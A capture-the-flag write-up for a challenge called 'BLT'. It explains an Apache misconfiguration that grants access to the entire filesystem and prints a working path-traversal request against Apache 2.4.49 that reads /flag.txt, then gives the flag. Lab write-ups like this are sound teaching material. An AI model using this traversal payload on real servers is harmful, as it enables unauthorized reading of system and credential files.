<h1>BLT</h1>

<h2>Description</h2>

<p>Our company provides services for the development of the most modern software.</p>

<p>Can you check our landing page for vulnerabilities?</p>

<p>Here's our website: <strong><code>164.90.201.196:8080/</code></strong></p>

<p>{% file src="../../.gitbook/assets/blt_a559171c04.zip" %}</p>

<h2>Solution</h2>

<p>Taking a look at the Dockerfile, we quickly see a misconfiguration in the <code>apache.conf</code> file.</p>

<p><code>docker
RUN echo "&lt;VirtualHost *:80&gt;\n \
DocumentRoot /var/www/html/\n \
&lt;Directory \"/\"&gt;\n \
 Require all granted\n \
&lt;/Directory&gt;\n \
&lt;/VirtualHost&gt;" &gt; /usr/local/apache2/conf/apache.conf
</code></p>

<p>Here, <code>&lt;Directory /&gt;</code> refers to the <em>filesystem</em> directory, not the web root. Hence, this configuration allows access to any file on the filesystem.</p>

<p>Taking a closer look a the server responses showed that the Apache server is on version 2.4.49, and vulnerable to a recent path traversal zero-day.</p>

<p><img src="../../.gitbook/assets/image (80) (1) (1) (1).png" alt="" /></p>

<p><code>GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag.txt HTTP/1.1</code> allows us to get the flag at <code>/flag.txt</code>.</p>

<p>The flag is <code>spbctf{th3_lat3st_d03s_n0t_m3an_s3cur3}</code></p>
